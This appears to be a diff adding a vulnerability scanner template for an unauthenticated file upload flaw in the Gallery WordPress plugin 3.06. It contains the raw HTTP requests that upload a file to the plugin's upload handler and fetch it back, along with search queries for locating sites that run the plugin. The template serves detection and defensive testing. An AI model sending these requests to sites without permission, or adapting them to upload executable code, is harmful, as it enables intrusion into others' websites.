@@ -1,0 +1,52 @@
+id: wp-gallery-file-upload
+
+info:
+  name: WordPress Plugin Gallery 3.06 - Arbitrary File Upload
+  author: r3Y3r53
+  severity: high
+  description: |
+    The Gallery by BestWebSoft WordPress plugin was affected by an Unauthenticated File Upload PHP Code Execution security vulnerability.
+  remediation: Fixed in version 3.1.1
+  reference:
+    - https://www.exploit-db.com/exploits/18998
+    - http://wordpress.org/extend/plugins/gallery-plugin/
+    - http://downloads.wordpress.org/plugin/gallery-plugin.3.06.zip
+    - https://wpscan.com/vulnerability/049c8518-1f52-4aa4-b0b3-218289727353
+  classification:
+    cpe: cpe:2.3:a:bestwebsoft:gallery:*:*:*:*:wordpress:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    publicwww-query: /wp-content/plugins/gallery-plugin/
+    google-query: inurl:/wp-content/plugins/gallery-plugin/
+    product: gallery
+    vendor: bestwebsoft
+  tags: wp,wp-plugin,wordpress,wpscan,file-upload,intrusive
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/gallery-plugin/upload/php.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary20kgW2hEKYaeF5iP
+
+        --WebKitFormBoundary20kgW2hEKYaeF5iP
+        Content-Disposition: form-data; name="qqfile"; filename="{{filename}}.png"
+
+        {{randstr}}
+
+        --WebKitFormBoundary20kgW2hEKYaeF5iP--
+      - |
+        GET /wp-content/plugins/gallery-plugin/upload/files/{{filename}}.png HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type_1, "text/html") && contains(content_type_2, "image/png")'
+          - 'contains(body_1, "success:true") && contains(body_2, "{{randstr}}")'
+        condition: and
+# digest: 4a0a00473045022100ad3387f8e6895a0e43973283dbefd4cc77743bf2aca49258620977c09dcc6eef022079e8aa5344c31fc3fe0ec4792eab09b756b2463057e3e8ccac4584ab2c1efd5c:922c64590222798bb761d5b6d8e72950
